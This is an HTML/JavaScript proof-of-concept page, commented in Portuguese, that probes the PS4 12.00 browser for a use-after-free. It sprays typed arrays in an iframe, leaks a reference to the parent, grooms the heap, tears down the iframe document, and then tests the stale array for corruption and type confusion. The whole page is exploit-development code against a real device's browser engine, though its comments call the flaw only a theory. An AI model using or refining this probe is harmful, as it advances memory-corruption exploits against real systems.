<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Iframe UAF Probe (Corrected)</title>
</head>
<body>

<h2>PS4 12.00 - Iframe Post-Teardown Test</h2>

<button onclick="startTest()">Start Test</button>
<p>Após clicar, clique em "Run Inside Frame" e interaja com o prompt (OPTIONS).</p>

<pre id="log" style="background:#111;color:#0f0;padding:10px;height:300px;overflow:auto;"></pre>

<script>
function log(msg) {
    document.getElementById("log").textContent += msg + "\n";
}

// O Parent vai guardar a REFERÊNCIA REAL da memória do iframe aqui
var leakedArray = null;

function startTest() {
    log("[*] Creating iframe...");

    const iframe = document.createElement("iframe");
    iframe.style.width = "400px";
    iframe.style.height = "200px";
    document.body.appendChild(iframe);

    // Usa setTimeout para garantir que o iframe está no DOM antes de escrever
    setTimeout(() => {
        const fWin = iframe.contentWindow;
        const fDoc = fWin.document;

        if (!fDoc) {
            log("[!] Erro: fDoc é null.");
            return;
        }

        fDoc.open();
        fDoc.write(`
            <html>
            <body>
            <button onclick="run()">Run Inside Frame</button>
            <script>
                // Aloca os arrays DENTRO do iframe
                let controllers = [];
                for (let i = 0; i < 5000; i++) {
                    let arr = new Float64Array(8);
                    arr[0] = 1337.1337 + i; // Valor reconhecível
                    controllers.push(arr);
                }

                window.run = function() {
                    if (document.documentElement.webkitRequestFullscreen) {
                        document.documentElement.webkitRequestFullscreen();
                    }

                    window.onblur = function() {
                        window.onblur = null; // Evita loop duplo

                        // 1. VAZAMENTO DIRETO DE REFERÊNCIA (Sem postMessage)
                        // Injetamos o array do iframe direto no escopo do Parent
                        parent.leakedArray = controllers[0];
                        parent.log("[+] Referência injetada no Parent direto do Iframe.");

                        // 2. PREPARAR O CAOS (GC agressivo para bagunçar o heap do iframe)
                        for (let i = 0; i < 20000; i++) {
                            new ArrayBuffer(0x1000);
                        }

                        // 3. TEARDOWN CRÍTICO
                        // Destrói o documento do iframe. A teoria do UAF diz que 
                        // a memória do iframe será liberada, MAS o Parent ainda tem o ponteiro.
                        parent.log("[*] Executando teardown (document.write)...");
                        setTimeout(() => {
                            document.open();
                            document.write("<h1>Teardown</h1>");
                            document.close();
                        }, 500);
                    };
                };
            <\/script>
            </body>
            </html>
        `);
        fDoc.close();
    }, 50);

    // =========================
    // TESTES PÓS-TEARDOWN (Roda no Parent)
    // =========================
    setTimeout(() => {
        log("[*] Running post-teardown tests...");

        if (!leakedArray) {
            log("[-] Nenhuma referência vazada encontrada. O ataque falhou antes do teardown.");
            return;
        }

        // Teste A: Acesso básico
        try {
            log("[TEST A] Array access [0]: " + leakedArray[0]);
            if (leakedArray[0] !== 1337.1337) {
                log("    -> CORRUPÇÃO DETECTADA! Valor mudou pós-teardown.");
            }
        } catch(e) {
            log("[TEST A ERROR] (UAF mitificado/Crashou): " + e);
        }

        // Teste B: Integridade de Metadados
        try {
            log("[TEST B] Buffer byteLength: " + leakedArray.buffer.byteLength);
        } catch(e) {
            log("[TEST B ERROR] " + e);
        }

        // Teste C: Type Confusion induzida
        try {
            log("[TEST C] DataView access...");
            let dv = new DataView(leakedArray.buffer);
            log("    -> getUint32(0): 0x" + dv.getUint32(0, true).toString(16));
        } catch(e) {
            log("[TEST C ERROR] " + e);
        }

    }, 4000);
}
</script>

</body>
</html>
